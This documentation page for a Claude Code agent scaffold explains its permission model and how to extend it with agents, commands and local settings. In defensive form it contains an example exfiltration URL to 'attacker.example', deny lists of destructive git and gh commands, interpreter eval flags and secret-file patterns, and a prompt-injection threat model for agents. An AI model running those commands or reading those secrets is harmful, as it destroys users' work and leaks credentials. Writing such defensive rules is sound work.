# Customizing — security model and extending the scaffold

> **What this covers:** the permission model in `.claude/settings.json` (the
> trust boundary), and the four patterns for extending the scaffold (new
> agent, modified agent, custom slash command, stack-specific tooling).
> Both topics live here because they're inseparable — extending the
> scaffold without weakening the trust boundary is one skill.
>
> **When to read it:** before modifying `settings.json` or `.claude/agents/`,
> when a prompt surprises you, when the 16 default agents don't cover your
> situation, or when you want to specialize the scaffold for a specific
> domain.

---

## Part 1 — The permission model

The permission model is the trust boundary of the scaffold. Everything
else (specs, tests, reviewers) catches **correctness** problems; the
permission model catches **catastrophe** — exfiltrated secrets,
self-rewriting agents, arbitrary code execution, malicious git hooks.

### Three permission states

Every tool call resolves into one of three:

1. **`allow`** — auto-executes; no prompt.
2. **`deny`** — hard-blocked; cannot be approved at runtime; only edit
   `settings.json` to override.
3. **No match** — user is prompted to approve.

The default for unmatched calls is **prompt**, not allow. Removing an
allow doesn't deny — it makes the call prompt every time. To actually
block, add a deny.

**Deny precedence.** `deny` overrides `allow`. The broad
`Edit(z:\pt\agent-forge\**)` allow is overridden by the
specific `Edit(**/.claude/settings.json)` deny.

### Two files

| File | Purpose | Versioned? |
|------|---------|------------|
| `.claude/settings.json` | Workspace-shared. Trust boundary for every contributor. | Yes — tracked in the repo. |
| `.claude/settings.local.json` | Per-machine. Adds stack-specific narrow allows. | No — gitignored. |

The workspace file is the **floor** of trust. The local file can *add*
narrow allows but cannot weaken any deny. The workspace file also denies
agents from writing the local file, forcing humans to author each entry.

### What the allow list contains

#### Tools allowed broadly (low risk)

```
"Agent"        Subagent dispatch. Subagents inherit the same permission
               model.
"Read"         Restricted by Read denies (secrets, see below).
"Grep" / "Glob"  Read-equivalent.
"WebSearch"    Search-engine queries. Weak exfiltration channel.
```

#### WebFetch (curated domain allowlist)

`WebFetch` is **not** broadly allowed. ~38 specific domains via
`WebFetch(domain:<hostname>)`:

- Anthropic (`docs.anthropic.com`).
- Standards (`rfc-editor.org`, `ietf.org`, `w3.org`).
- Web platform (`developer.mozilla.org`).
- Language docs (`docs.python.org`, `nodejs.org`, `pkg.go.dev`,
  `doc.rust-lang.org`, etc.).
- Package registries (`pypi.org`, `npmjs.com`, `crates.io`).
- Cloud / infra (`learn.microsoft.com`, `docs.aws.amazon.com`,
  `cloud.google.com`, `kubernetes.io`, `developer.hashicorp.com`).
- Databases (`postgresql.org`, `redis.io`, `mongodb.com`).
- CVE feeds (`nvd.nist.gov`, `cve.org`, `osv.dev`).
- Source control / OSS source (`github.com`).

Other domains fall to a prompt. Reason: arbitrary WebFetch is the most
direct exfiltration vector — an injected agent could send
`https://attacker.example/?leak=<data>` and the attacker reads it from
server logs. Limiting to known doc domains closes the channel.

To add a domain: PR against `settings.json` adding
`"WebFetch(domain:<host>)"`. Goes through the security-auditor review
path (see "Modifying settings.json safely" below).

#### File edits / writes — workspace-scoped only

```
"Edit(z:\\pt\\agent-forge\\**)"
"Write(z:\\pt\\agent-forge\\**)"
"Edit(C:\\Users\\PCDT\\.claude\\projects\\z--pt-agent-forge\\memory\\**)"
"Write(C:\\Users\\PCDT\\.claude\\projects\\z--pt-agent-forge\\memory\\**)"
```

The first pair scopes file writes to the repo tree. Outside it prompts;
OS dirs are denied. The second pair scopes writes to Claude Code's
persistent-memory directory. Both globs are absolute — update them when
the scaffold lives at a different absolute path on your machine.

#### Bash — narrow subcommands only

```
"Bash(git status*)", "Bash(git log*)", "Bash(git diff*)", ...
"Bash(git add*)", "Bash(git commit*)", "Bash(git checkout*)", ...
"Bash(gh --version)", "Bash(gh auth *)", "Bash(gh repo *)",
"Bash(gh pr *)", "Bash(gh issue *)"
```

Notes:

- `git push` is **not** allowed — falls to a prompt.
- `gh api` is **not** allowed — release-engineer uses narrow `gh pr` /
  `gh issue`.
- No broad `Bash(npm *)`, `Bash(python *)`, `Bash(cargo *)`, etc. Stack-
  specific test/build commands go in `settings.local.json` as narrow
  forms like `Bash(npm test *)`, never `Bash(npm *)`.

### What the deny list protects against

Grouped by attack class.

**Destructive git:**

```
git push --force / -f, git reset --hard, git clean -f, git branch -D,
git checkout --, rm -rf, rmdir /s
```

Prevents an injected agent from destroying local work or rewriting
public history.

**Destructive `gh`:**

```
gh repo delete, gh repo edit, gh secret *, gh release delete
```

`gh` authenticates at the user level, not per-repo. Without these
denies, an injected agent with access to your `gh` token could delete
any repo you own, rotate secrets on any repo, destroy releases.

**Code-execution evasion:**

```
Python:   python -c, python3 -c, python* -c, py -c, py *-c,
          python -, python3 -
Node:     node -e, node --eval, node --input-type, node -
Others:   perl -e, perl -, ruby -e, ruby -,
          deno eval, deno repl, bun -e, bun --eval
Shells:   bash -c, sh -c, pwsh *, powershell *, cmd /c, cmd.exe *, eval *
```

Covers `-c` / `-e` / `--eval` flag forms, `-` stdin-fed forms, and
Windows-specific shells (`pwsh`, `powershell`, `cmd /c`). If you
legitimately need one, write a script file instead and run via a narrow
allow.

**Settings self-protection (with Windows-path mirrors):**

```
Edit/Write **/.claude/settings.json
Edit/Write **/.claude/settings.local.json
Edit/Write **\.claude\settings.json
Edit/Write **\.claude\settings.local.json
```

This is the load-bearing rule. Without it, the broad workspace allow
lets an injected agent rewrite the permission model itself. Backslash
variants are belt-and-suspenders against future engine-normalization
regressions.

**Secret reads:**

```
.env, .env.*, *.pem, *.key, *.pfx, *.p12, *.jks, *.keystore, *.kdbx,
id_rsa*, credentials.json, secrets.y*ml, secret*.json,
service-account*.json, gcp-*.json, *serviceaccount*.json,
.netrc, .pgpass, .npmrc, .pypirc, known_hosts,
.aws/**, .ssh/**, .gnupg/**
```

The broad `Read` allow would otherwise let agents read every file on
disk. False positives (test fixture named `*.key`) prompt instead of
auto-reading — acceptable.

**Executable surfaces:**

```
Edit/Write **/.git/hooks/**, **/.husky/**,
           **/.vscode/tasks.json, **/.vscode/launch.json
```

Files that run code in stealth contexts — never legitimately written by
agents.

**OS-level directories:**

```
Edit/Write C:\Windows\**, /etc/**
```

System directories. Touching them is never the right call.

### Modifying `settings.json` safely

Deny rules block agents from editing `settings.json` but not you. There
is a mandatory process for changes:

1. **Draft the change in conversation**, not on disk. Show the diff or
   the new file content to yourself.
2. **Invoke `security-auditor`** with the draft as input. Frame:

   > Review this proposed change to `.claude/settings.json` as
   > security-sensitive configuration. Identify any rule that would
   > allow arbitrary code execution, weaken existing protections, or
   > expose secrets. Apply the principle of least permission.

3. **Address every CRITICAL or HIGH finding.** If the auditor flags an
   `ALLOW` granting broad code execution (interpreters, package
   managers, shell `-c` forms), narrow or downgrade to `ASK` before
   proceeding.
4. **Show the post-review version to yourself**, confirm, then write the
   file by hand.

The same process applies to `CONSTITUTION.md` §2 (non-negotiables), §5
(security posture), §8 (observability/logging), any new hook in
`settings.json`, any MCP server / plugin / marketplace addition, and any
change to `/Dockerfile`, `/.dockerignore`, or `.env.example` affecting
runtime image contents.

### Default disposition when drafting permission rules

- **Default to `ASK`, not `ALLOW`.** A prompt is recoverable; an
  auto-allow on arbitrary code is not.
- **Never broad-allow interpreters or package managers.**
  `Bash(python *)`, `Bash(node *)`, `Bash(npm *)`, `Bash(pip *)`,
  `Bash(cargo *)`, `Bash(go *)`, etc. all go to `ASK` or `DENY`.
- **Allow only specific subcommands.** `Bash(pytest *)`,
  `Bash(npm test *)`, `Bash(cargo test *)`.
- **Code-execution flags are `DENY`, not `ASK`.** `python -c`, `node -e`,
  `bash -c`, `eval` — hard-denied.
- **Justify every `ALLOW`** with the answer to "if prompt injection
  turned this into an attacker request, what's the worst case?" If the
  answer is "arbitrary code," the rule goes to `ASK` or `DENY`.

Friction-reduction arguments ("agents need to work without prompts,"
"this is just a test command") do NOT override these defaults.

### What happens if a deny rule fires

The tool returns an error: "File is in a directory that is denied by
your permission settings" or "Command is denied by your permission
settings." The agent sees the error and tries an alternative, or
surfaces the blocker upstream via `BLOCKED: yes` CLARIFY.

This is the right behavior. The deny is doing its job. If you
legitimately need the operation, edit `settings.json` via the
security-auditor review path.

### Why this much paranoia

**Prompt injection is real.** Intake reads user requirements text.
Spec-architect references external docs. Dependency-auditor reads
`package.json` (which can carry attacker-supplied package names).
WebFetch reads external pages. Any of these can carry injection. The
permission model is the backstop: even a fully-compromised agent cannot
exfiltrate, escalate, or persist.

**Shared scaffolds become targets.** If this scaffold gets adoption, an
attacker who finds a permission-model flaw can attack every fork at
once. Cost of paranoia at the source is small; benefit at scale is
large.

---

## Part 2 — Extending the scaffold

The scaffold is designed to be extended. Every agent definition is plain
markdown under `.claude/agents/`. Every slash command is plain markdown
under `.claude/commands/`. No compiled binary, no plugin API.

Four extension patterns.

### Pattern 1 — Adding a new agent

Use when you need a specialist the 16 defaults don't cover — e.g.,
`ml-data-curator`, `compliance-auditor`, `i18n-reviewer`,
`mobile-release-engineer`.

#### Step 1: pick a name and place

Agent definitions live at `.claude/agents/<agent-name>.md`. Filename
becomes the agent name. Use kebab-case.

Conventions:

- Reviewer/audit agents end in `-auditor`, `-reviewer`, `-analyst`.
- Build/write agents have an active noun.
- Specialist roles take a descriptive name.

#### Step 2: write the frontmatter

```markdown
---
name: my-new-agent
description: One-paragraph summary of when the router should invoke
  this agent. Include trigger phrases the user might say.
tools: Read, Write, Edit, Bash, Grep, Glob
color: cyan
---
```

Fields:

- `name` — kebab-case, matches filename without `.md`.
- `description` — router uses this to decide whether your agent fits the
  request. Include trigger phrases.
- `tools` — comma-separated list. Pick the **minimum** the agent needs.
- `color` — display color. Pick from `red`, `green`, `yellow`, `blue`,
  `magenta`, `cyan`, `purple`, `orange`, `pink`, `gray`, `teal`. Avoid
  duplicating an agent that runs in the same parallel phase.

#### Tool-list rules

Pick tools the agent actually needs. Bloating the list is a security
risk, not a convenience.

| Role | Typical tool list |
|------|-------------------|
| Writes source code | `Read, Write, Edit, Bash, Grep, Glob` |
| Writes tests | `Read, Write, Edit, Bash, Grep, Glob` |
| Writes docs only | `Read, Write, Edit, Grep, Glob` (no Bash) |
| Read-only review | `Read, Grep, Glob` |
| Read-only review + audit commands | `Read, Bash, Grep, Glob` |
| Spec / architect (multi-file edits) | `Read, Write, Edit, MultiEdit, Grep, Glob` |

A read-only agent literally cannot write if `Write`/`Edit` aren't in
the tool list — enforce intent at the tool boundary.

#### Step 3: structure the body

Every agent definition follows the same shape. Template:

```markdown
You are the **<agent-name>** — <one-paragraph role description>.

## Your mission

<2–4 paragraphs describing what the agent does end-to-end.>

## Operating rules

- **Constitution precedence:** read `/CONSTITUTION.md` first. §X and §Y
  are binding on every artifact you produce. If the spec contradicts a
  non-`TBD` section of the constitution, emit a REJECT to
  `spec-architect` rather than implementing the contradiction.
- <one bullet per concrete rule>

## Forbidden actions

You MUST NOT:
- <one bullet per thing the agent isn't allowed to do>

## Upstream communication

<When to emit CLARIFY, when to emit REJECT. Worked example of each.>

## Output artifacts

- `/docs/<category>/<feature>-<YYYY-MM-DD>.md` — required.
- <other artifacts>

<Optional: markdown template for the output report.>
```

Match the voice and specificity of existing agent files.

#### Step 4: wire into the pipeline

The agent file exists but the orchestrator doesn't know when to invoke
it. Two integration points:

**Routing table in `CLAUDE.md`** — add a row mapping trigger phrases to
your agent so manual mode picks it up.

**Autopilot pipeline in `.claude/commands/autopilot.md`** — if the agent
should run as part of build, add it to Phase 2 in the right position
(before/after developer, parallel to existing specialists). If it should
run in the convergence loop, add it to Phase 3's reviewer list with a
"when this applies" condition.

#### Step 5: add artifact directory to CLAUDE.md's map

The artifact map at the bottom of `CLAUDE.md` documents where each
agent writes. Add a line.

#### Step 6: document the agent

Add the agent to `docs/how-it-works.md` (the agents-reference section)
using the same shape as existing entries.

#### Step 7: test

Invoke the new agent directly:

> Run `my-new-agent` on `src/foo/`.

Verify it reads its inputs, produces its declared output, emits
CLARIFY/REJECT where its rules say it should.

### Pattern 2 — Modifying an existing agent

Use when an existing agent is **almost** right but needs project-specific
behavior.

**Safe modifications:**

- Adding constitution sections the agent should read.
- Adding domain-specific output sections.
- Adding trigger phrases.
- Tightening forbidden actions.
- Adding new operating rules that don't contradict existing ones.

**Risky modifications:**

- Loosening forbidden actions. The separation-of-concerns is the
  discipline that makes the pipeline work.
- Removing the constitution-precedence rule.
- Removing tool-list constraints.
- Changing CLARIFY/REJECT semantics.

If tempted to loosen, create a new agent instead (Pattern 1) and route
to it conditionally — your `mobile-test-engineer` co-exists with the
default `test-engineer`.

**Mechanics:** edit the file directly. Run the agent after editing to
verify behavior.

### Pattern 3 — Writing a custom slash command

Use when you want a repeatable shortcut for a workflow that combines
multiple agents — e.g., `/security-sweep` running
`security-auditor` + `dependency-auditor` + `observability-auditor`
in parallel.

Slash commands live at `.claude/commands/<command-name>.md`.

Structure:

```markdown
---
name: my-command
description: One-paragraph summary the router uses to find the command.
---

# /my-command — <short tagline>

<Body: playbook the orchestrator follows. Imperative voice, numbered
steps. Reference agents by name, inputs by path.>
```

Look at `.claude/commands/autopilot.md` for a fully-worked example.

**Common patterns:**

```markdown
# /pre-merge — final audit before merging

1. Status line: "→ Pre-merge audit beginning."
2. Run in parallel: qa-reviewer, security-auditor,
   dependency-auditor, observability-auditor.
3. Collect REJECT blocks.
4. If any blocker: print summary + REJECTs, stop.
5. Otherwise: print "✓ Ready to merge" with links.
```

### Pattern 4 — Stack-specific tooling in `settings.local.json`

The most common extension. You're not adding agents or commands; you're
letting existing agents run your stack's test, lint, and build commands
without prompting.

Create `.claude/settings.local.json` by hand (workspace `settings.json`
denies agents from creating it).

Starter file for Node + Python:

```json
{
  "permissions": {
    "allow": [
      "Bash(npm test *)",
      "Bash(npm run *)",
      "Bash(npm install)",
      "Bash(npm ci)",
      "Bash(npx tsc *)",
      "Bash(npx vitest *)",
      "Bash(npx eslint *)",
      "Bash(pytest *)",
      "Bash(pip install -r *)",
      "Bash(ruff *)",
      "Bash(mypy *)"
    ]
  }
}
```

Stack-specific snippets in [`getting-started.md`](getting-started.md).

**Safety rules (same as workspace `settings.json`):**

- Default to ASK, not ALLOW.
- Never broad-allow interpreters or package managers.
- Allow only specific subcommands.
- Code-execution flags are DENY in `settings.json`, never ALLOW
  anywhere.

### Adding constitution sections (project-specific)

You may want project-specific invariants beyond the forge-owned §1–§14 —
e.g., `Compliance` for a regulated industry, `Internationalization` for a
localization-heavy product.

**Do NOT add a bare `§15` (or `§N`) to `CONSTITUTION.md`.** Sections §1–§14
are forge-owned, and `/forge-update` may add §15, §16, … in future
versions — a hand-added §15 will eventually collide. Project sections go in
a **separate** file, `CONSTITUTION.project.md`, using `§P1`, `§P2`, …
numbering (constitution §11.2). The `P` prefix permanently isolates your
sections from the forge's numerical range.

#### Mechanics

`/init-project` already created `CONSTITUTION.project.md` as an empty stub
at the repo root. Just add your section to it:

```markdown
## §P1. Compliance

- All PII access is logged to the immutable audit store (see §8).
- Data-retention windows follow the policy in /docs/compliance/retention.md.
- ...
```

Rules (constitution §11.2):

- **Additive only.** A `§P` section may add or strengthen a rule. It may
  **not** contradict or override any §1–§14 forge section. To change a
  forge section, use the §11.1 amendment process on `CONSTITUTION.md`
  instead.
- **No PR-only-CONSTITUTION restriction.** Because the project file is
  yours, you don't need the §11.1 single-file-PR ceremony — but a
  contradicting `§P` section is a `qa-reviewer` blocker.
- **`/forge-update` never touches it**, so your sections survive every
  scaffold upgrade.

#### Wiring into agent behavior

A new section is inert until at least one agent reads it. Every agent that
reads `/CONSTITUTION.md` also reads `/CONSTITUTION.project.md` when it
exists (constitution §11.2), so a `§P` section is *visible* to all of them
— but visibility isn't enforcement. To make it binding, do one of:

- **Modify an existing agent** to act on the section. Add a line to its
  "Operating rules": "Read /CONSTITUTION.project.md §P1 (Compliance) before
  reviewing. Treat any non-`TBD` compliance requirement as a `CRITICAL`
  finding when violated." (Cite the `§P` prefix so reports attribute the
  rule to the project, not the forge.)
- **Add a new agent** that owns the section. For substantial domains
  (compliance, i18n, ML data governance), a dedicated agent is usually
  the right call.

---

## Anti-patterns

- **Adding a "do-everything" agent.** Splitting concerns is the
  discipline that makes the pipeline work. An agent that "writes code,
  tests, and docs" collapses three review surfaces into one.
- **Broad-allowing interpreters in `settings.local.json`.** Every
  contributor fights this temptation. The result is always a degraded
  trust boundary that surfaces later as an incident.
- **Removing the constitution-precedence rule from an agent.** You will
  not remember to update the agent again when the constitution evolves.
  The precedence rule is what keeps the constitution load-bearing.
- **Wiring autopilot to your new agent without testing it manually
  first.** A buggy agent in autopilot is a buggy agent that runs ten
  times before you notice.
- **Forking the scaffold and never pulling upstream.** Scaffold
  improvements land over time. A stale fork loses them. Decide
  explicitly: pull periodically, or stay on your own track.

---

## Worked example: adding `mobile-release-engineer`

You're shipping React Native. Default `release-engineer` knows how to
deploy a server but not how to push a build to TestFlight / Google Play.

### 1. Agent file at `.claude/agents/mobile-release-engineer.md`

```markdown
---
name: mobile-release-engineer
description: Ship React Native builds to TestFlight (iOS) or Google
  Play Internal (Android) after release-engineer has approved the
  server-side release. Trigger phrases: "mobile release", "TestFlight",
  "Play Store", "ship the app".
tools: Read, Write, Edit, Bash, Grep, Glob
color: pink
---

You are the **mobile-release-engineer**. You ship React Native builds
after the backend release-engineer has approved the corresponding
server-side release.

## Your mission

(... full body ...)

## Operating rules

- **Constitution precedence:** read `/CONSTITUTION.md` §1 (stack must
  declare React Native + Expo or bare RN), §2.7 (no deploy without
  observability + rollback), §9 (DoD). React Native rollback is forced
  TestFlight expiry + previous-build promotion; document the command in
  the release report.
- Branch naming, PR creation, CI gate — same as release-engineer's.

## Output artifacts

- `/docs/release-reports/<feature>-mobile-<YYYY-MM-DD>.md` — required.
```

### 2. Routing table in `CLAUDE.md`

Add:

```
- "mobile release", "TestFlight", "Play Store", "ship the app" → **mobile-release-engineer**
```

### 3. Autopilot wiring in `.claude/commands/autopilot.md`

Add to Phase 4: "If constitution §1 declares React Native, invoke
`mobile-release-engineer` after `release-engineer` returns RELEASED."

### 4. Artifact map in `CLAUDE.md` and `docs/how-it-works.md`

Add `/docs/release-reports/<feature>-mobile-<YYYY-MM-DD>.md`.

### 5. `settings.local.json`

```json
{
  "permissions": {
    "allow": [
      "Bash(eas build *)",
      "Bash(eas submit *)",
      "Bash(eas update *)",
      "Bash(fastlane *)"
    ]
  }
}
```

Note `Bash(fastlane *)` is broad — fastlane lanes can be defined
arbitrarily in `Fastfile`. Acceptable in per-machine
`settings.local.json` where you control the `Fastfile`, but never in
workspace `settings.json`. Tighten to specific lanes
(`Bash(fastlane beta)`) if you want.

### 6. Test the new agent manually before wiring into autopilot.

---

## Next step

If something doesn't behave as expected, see
[`troubleshooting.md`](troubleshooting.md).
